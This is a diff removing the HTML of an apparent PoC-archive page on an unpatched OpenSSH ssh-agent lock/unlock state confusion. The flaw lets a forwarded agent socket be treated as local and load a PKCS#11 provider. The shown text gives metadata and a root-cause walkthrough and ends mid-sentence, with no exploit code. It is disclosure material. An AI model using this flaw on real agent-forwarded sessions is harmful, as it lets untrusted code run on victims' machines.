@@ -1,113 +1,782 @@
-<!doctype html><html lang=en class="dark scroll-smooth"><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive</title><meta name=description content="OpenSSH's ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…"><meta name=author content="intelseclab"><meta name=theme-color content="#09090b"><meta name=keywords content="CVE,PoC,exploit,proof of concept,security research,OpenSSH portable — ssh,sshd,ssh-agent,openssh,ssh-agent,agent-forwarding,pkcs11,race-condition,state-confusion,no-cve,local-provider-abuse"><link rel=canonical href=https://poc.intelseclab.com/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/><meta property="og:title" content="OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive"><meta property="og:description" content="OpenSSH's ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…"><meta property="og:type" content="article"><meta property="og:url" content="https://poc.intelseclab.com/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/"><meta property="og:site_name" content="PoC Archive"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://poc.intelseclab.com/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name=twitter:image content="https://poc.intelseclab.com/og-image.png"><meta name=twitter:card content="summary_large_image"><meta property="article:published_time" content="2026-07-12T00:00:00Z"><meta property="article:modified_time" content="2026-07-12T00:00:00Z"><meta property="article:tag" content="openssh"><meta property="article:tag" content="ssh-agent"><meta property="article:tag" content="agent-forwarding"><meta property="article:tag" content="pkcs11"><meta property="article:tag" content="race-condition"><meta property="article:tag" content="state-confusion"><meta property="article:tag" content="no-cve"><meta property="article:tag" content="local-provider-abuse"><meta name=twitter:title content="OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive"><meta name=twitter:description content="OpenSSH's ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…"><meta name=twitter:site content="@intelseclab"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=language content="en"><meta name=revisit-after content="3 days"><meta name=robots content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><script>(function(){try{var e=localStorage.getItem("theme");e==="light"?document.documentElement.classList.remove("dark"):document.documentElement.classList.add("dark")}catch{}})()</script><script src="https://cdn.tailwindcss.com?plugins=typography"></script><script>tailwind.config={darkMode:"class",theme:{extend:{fontFamily:{sans:["Inter","ui-sans-serif","system-ui","sans-serif"],mono:['"JetBrains Mono"',"ui-monospace","SFMono-Regular","monospace"]},colors:{mono:{bg:"#0b0f12",card:"#12181d",border:"#1e262c",hover:"#182129",muted:"#64748b"},brand:{DEFAULT:"#10b981",dim:"#064e3b",light:"#a7f3d0"}}}}}</script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/syntax.css><style>html.dark body{background-color:#0b0f12}body,body *{transition:background-color .15s ease,border-color .15s ease,color .15s ease}html,body{overflow-x:hidden;max-width:100%}.prose :where(p,li,blockquote,td,th){overflow-wrap:break-word;word-break:break-word}.prose :where(code):not(pre code){overflow-wrap:break-word;word-break:break-word}.prose table th:first-child,.prose table td:first-child{width:1%;white-space:nowrap}.poc-code-body pre{margin:0 !important;padding:.55rem .85rem !important;background:0 0 !important}.poc-code-body .chroma{background:0 0 !important}.poc-code-body table{margin:0 !important;width:100%;border:0}.poc-code-body td{padding:0 !important;border:0 !important}.poc-code-body td:first-child{width:1%;white-space:nowrap}.toc #TableOfContents ul,.toc>nav ul{list-style:none;padding-left:0;margin:0}.toc #TableOfContents li,.toc>nav li{margin-top:.25rem}.toc #TableOfContents li li,.toc>nav li li{padding-left:.75rem}.toc #TableOfContents a,.toc>nav a{color:#71717a;text-decoration:none;font-family:var(--font-mono,"JetBrains Mono",ui-monospace,monospace);font-size:.75rem;transition:color .15s}.toc #TableOfContents a:hover,.toc>nav a:hover{color:#059669}.dark .toc #TableOfContents a,.dark .toc>nav a{color:#a1a1aa}.dark .toc #TableOfContents a:hover,.dark .toc>nav a:hover{color:#34d399}</style><link rel=alternate type=application/rss+xml href=https://poc.intelseclab.com/index.xml title="PoC Archive — all new PoCs"><link rel=icon type=image/svg+xml href=/favicon.svg></head><body class="min-h-screen bg-white text-zinc-900 font-sans antialiased selection:bg-emerald-400/20 selection:text-emerald-900 dark:bg-mono-bg dark:text-zinc-100 dark:selection:text-emerald-200"><header class="sticky top-0 z-40 border-b border-zinc-200/80 bg-white/80 backdrop-blur dark:border-mono-border dark:bg-mono-bg/80"><div class="mx-auto flex w-full max-w-6xl items-center gap-4 px-4 py-3 sm:px-6 lg:px-8"><a href=/ class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-zinc-900 dark:text-zinc-100"><img src=/favicon.svg width=36 height=36 alt="PoC Archive">
-<span>PoC Archive</span></a><nav class="ml-2 hidden items-center gap-1 text-sm sm:flex"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">home</a>
-<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100 !text-emerald-600 dark:!text-emerald-400">pocs</a>
-<a href=/watchlist/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">watchlist</a></nav><div class="ml-auto hidden items-center gap-3 font-mono text-xs sm:flex"><span class="flex items-center gap-1.5 text-zinc-500 dark:text-zinc-400"><span class="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-500"></span>
-<strong class="font-semibold text-zinc-800 dark:text-zinc-100">770</strong> PoCs
-</span><span class="text-zinc-300 dark:text-zinc-700">|</span>
-<a href="/pocs/?signal=kev" class="font-semibold text-red-600 transition hover:underline dark:text-red-400">119 CISA KEV</a></div><div class="ml-auto flex items-center gap-2 sm:ml-3"><a href=https://poc.intelseclab.com/index.xml target=_blank rel="noopener noreferrer" title="RSS feed of new PoCs" aria-label="RSS feed" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover"><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg>
-</a><a href=https://github.com/intelseclab/poc-archive target=_blank rel="noopener noreferrer" class="hidden rounded-md border border-zinc-200 px-3 py-1.5 text-xs font-medium text-zinc-700 transition hover:bg-zinc-100 sm:inline-flex dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">GitHub
-</a><button type=button id=theme-toggle aria-label="Toggle color theme" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 focus:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">
-<svg class="hidden h-4 w-4 dark:block" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
-<svg class="block h-4 w-4 dark:hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 009 9 9 9 0 11-9-9z"/></svg></button></div></div><nav class="flex items-center gap-1 border-t border-zinc-200 px-4 py-2 text-sm sm:hidden dark:border-mono-border"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">home</a>
-<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">pocs</a>
-<a href=/watchlist/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">watchlist</a></nav><script>(function(){var e=document.getElementById("theme-toggle");if(!e)return;e.addEventListener("click",function(){var e=document.documentElement,t=e.classList.toggle("dark");try{localStorage.setItem("theme",t?"dark":"light")}catch{}})})()</script></header><main class="mx-auto w-full max-w-6xl px-4 py-8 sm:px-6 lg:px-8"><nav class="mb-4 flex flex-wrap items-center justify-between gap-2 font-mono text-xs"><div class="flex min-w-0 items-center gap-2 text-zinc-500 dark:text-mono-muted"><a href=/pocs/ class="transition hover:text-emerald-600 dark:hover:text-white">pocs</a>
-<span>/</span>
-<a href=/pocs/network/ class="transition hover:text-emerald-600 dark:hover:text-white">network</a>
-<span>/</span>
-<span class="truncate text-emerald-600 dark:text-brand">entry</span></div><a href=/pocs/ class="flex shrink-0 items-center gap-1 text-zinc-500 transition hover:text-emerald-600 dark:text-mono-muted dark:hover:text-white"><svg class="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-<span class="hidden sm:inline">Back to catalogue</span></a></nav><div class="space-y-4 rounded-lg border border-zinc-200 bg-white p-5 dark:border-mono-border dark:bg-mono-card"><div class="flex flex-wrap items-center justify-between gap-2 font-mono text-xs"><div class="flex flex-wrap items-center gap-2"><span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">category: network</span>
-<span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 font-bold text-zinc-900 dark:border-mono-border dark:bg-mono-bg dark:text-white">(HIGH)</span></div><span class="flex items-center gap-1.5 whitespace-nowrap text-[11px] font-medium text-red-500 dark:text-red-400" title="No vendor fix at the time of writing"><span class="h-2 w-2 rounded-full animate-pulse bg-red-500"></span>Unpatched</span></div><div class=space-y-1><h1 class="text-balance font-mono text-lg font-bold tracking-tight text-zinc-900 sm:text-xl dark:text-white">OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE)</h1><p class="font-mono text-xs text-zinc-500 dark:text-mono-muted">Published: <span class="text-zinc-700 dark:text-slate-300">2026-07-12</span> • Researcher: <span class="text-emerald-600 dark:text-brand">bikini (exploitarium)</span></p></div><div class="grid grid-cols-2 gap-3 border-t border-zinc-200/60 pt-3 font-mono text-xs sm:grid-cols-4 dark:border-mono-border/60"><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Target software</span>
-<span class="block break-words text-zinc-800 dark:text-slate-300">OpenSSH portable — ssh, sshd, ssh-agent</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Affected versions</span>
-<span class="block break-words text-zinc-800 dark:text-slate-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Status</span>
-<span class="block break-words text-zinc-800 dark:text-slate-300">PoC — reproducible against a signed, checksum/signature-verified stock OpenSSH 10.4p1 build; no weaponized payload beyond starting an allowed PKCS#11 provider</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Severity</span>
-<span class="block break-words text-zinc-800 dark:text-slate-300">High</span></div></div></div><div class="mt-6 grid grid-cols-1 gap-6 lg:grid-cols-4"><div class="min-w-0 space-y-4 lg:col-span-3"><div class=lg:hidden><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/network/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">OpenSSH portable — ssh, sshd, ssh-agent</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-12</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-red-500 dark:text-red-400" title="No vendor fix at the time of writing">Unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/openssh/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#openssh</a>
-<a href=/tags/ssh-agent/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ssh-agent</a>
-<a href=/tags/agent-forwarding/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#agent-forwarding</a>
-<a href=/tags/pkcs11/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pkcs11</a>
-<a href=/tags/race-condition/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#race-condition</a>
-<a href=/tags/state-confusion/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#state-confusion</a>
-<a href=/tags/no-cve/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no-cve</a>
-<a href=/tags/local-provider-abuse/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#local-provider-abuse</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://www.openbsd.org/openssh/agent-restrict.html target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.openbsd.org/openssh/agent-restrict.html</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://man.openbsd.org/ssh-agent.1 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://man.openbsd.org/ssh-agent.1</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-mono-border"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-intelseclab/poc-archive</a></div></div></div><details class="rounded-lg border border-zinc-200 lg:hidden dark:border-mono-border dark:bg-mono-card"><summary class="cursor-pointer select-none px-4 py-2 font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-mono-muted">On this page</summary><div class="toc border-t border-zinc-100 px-4 pb-3 text-sm leading-relaxed dark:border-mono-border"><nav id=TableOfContents><ul><li><a href=#metadata>Metadata</a></li><li><a href=#affected-target>Affected Target</a></li><li><a href=#summary>Summary</a></li><li><a href=#vulnerability-details>Vulnerability Details</a><ul><li><a href=#root-cause>Root Cause</a></li><li><a href=#attack-vector>Attack Vector</a></li><li><a href=#impact>Impact</a></li></ul></li><li><a href=#environment--lab-setup>Environment / Lab Setup</a><ul><li><a href=#setup-steps>Setup Steps</a></li></ul></li><li><a href=#proof-of-concept>Proof of Concept</a><ul><li><a href=#step-by-step-reproduction>Step-by-Step Reproduction</a></li><li><a href=#exploit-code>Exploit Code</a></li><li><a href=#expected-output>Expected Output</a></li></ul></li><li><a href=#detection--indicators-of-compromise>Detection & Indicators of Compromise</a></li><li><a href=#remediation>Remediation</a></li><li><a href=#references>References</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></details><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=metadata class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
-Metadata</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Date Added</strong></td><td>2026-07-12</td></tr><tr><td><strong>Last Updated</strong></td><td>2026-07-12</td></tr><tr><td><strong>Author / Researcher</strong></td><td>bikini (exploitarium)</td></tr><tr><td><strong>CVE / Advisory</strong></td><td>N/A</td></tr><tr><td><strong>Category</strong></td><td>network</td></tr><tr><td><strong>Severity</strong></td><td>High</td></tr><tr><td><strong>CVSS Score</strong></td><td>N/A (no official score published) — local-state-confusion bug reachable only through an established, agent-forwarded SSH session</td></tr><tr><td><strong>Status</strong></td><td>PoC — reproducible against a signed, checksum/signature-verified stock OpenSSH 10.4p1 build; no weaponized payload beyond starting an allowed PKCS#11 provider</td></tr><tr><td><strong>Tags</strong></td><td>openssh, ssh-agent, agent-forwarding, pkcs11, race-condition, state-confusion, no-cve, local-provider-abuse</td></tr><tr><td><strong>Related</strong></td><td>N/A</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=affected-target class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
-Affected Target</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Software / System</strong></td><td>OpenSSH portable — <code>ssh</code>, <code>sshd</code>, <code>ssh-agent</code></td></tr><tr><td><strong>Versions Affected</strong></td><td>Portable tags <code>V_9_3_P2</code> through <code>V_10_4_P1</code> (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</td></tr><tr><td><strong>Language / Platform</strong></td><td>C, Linux (tested on Ubuntu 24.04.4 LTS x86-64 under WSL2)</td></tr><tr><td><strong>Authentication Required</strong></td><td>Yes — the attacker must be (or control) the remote SSH server/session the victim connects to with agent forwarding enabled</td></tr><tr><td><strong>Network Access Required</strong></td><td>Yes — requires an active <code>ssh -A</code> (agent-forwarded) connection between victim client and the attacker-influenced remote side</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=summary class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
-Summary</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><p>OpenSSH&rsquo;s <code>ssh-agent</code> supports being locked with a password, during which it is supposed to refuse essentially all requests — including the <code>session-bind@openssh.com</code> extension that a forwarded agent connection uses to record which remote session it belongs to. The bug is a state-tracking gap: when the agent is locked, extension requests (including session-bind) are rejected at a global locked-check <em>before</em> the agent ever records that the bind was attempted or failed. The SSH client, meanwhile, still creates the forwarded agent channel even though the bind was refused. Once the agent is later unlocked through a separate, legitimate local connection, the persistent forwarded socket has no record of ever having attempted (and failed) a session bind — so the classification function <code>socket_is_remote()</code> incorrectly treats it as a local connection. A request on that forwarded socket to add a PKCS#11 provider (<code>SSH_AGENTC_ADD_SMARTCARD_KEY</code>) is then processed as if it came from a trusted local caller, bypassing the remote-provider restriction that OpenSSH added specifically to stop forwarded/remote agent connections from loading arbitrary PKCS#11 modules.</p></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=vulnerability-details class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42.0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-Vulnerability Details</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><h3 id=root-cause>Root Cause</h3><p>The flaw spans OpenSSH&rsquo;s client and agent:</p><ol><li><code>clientloop.c</code>&rsquo;s <code>client_request_agent()</code> creates a forwarded agent channel even when <code>ssh_agent_bind_hostkey()</code> reports the session bind was refused.</li><li><code>ssh-agent.c</code>&rsquo;s <code>process_message()</code> applies a global &ldquo;locked&rdquo; check <em>before</em> its main request dispatcher — while locked, every extension request (including <code>session-bind@openssh.com</code>) is discarded before <code>process_extension()</code> can even parse which extension it was.</li><li>Because the bind request never reaches <code>process_ext_session_bind()</code>, the <code>session_bind_attempted</code> marker is never set for that forwarded socket.</li><li>After a separate, legitimate local connection unlocks the agent, <code>socket_is_remote()</code> finds neither a recorded session identifier nor a failed-bind marker on the forwarded socket, so it (incorrectly) classifies it as 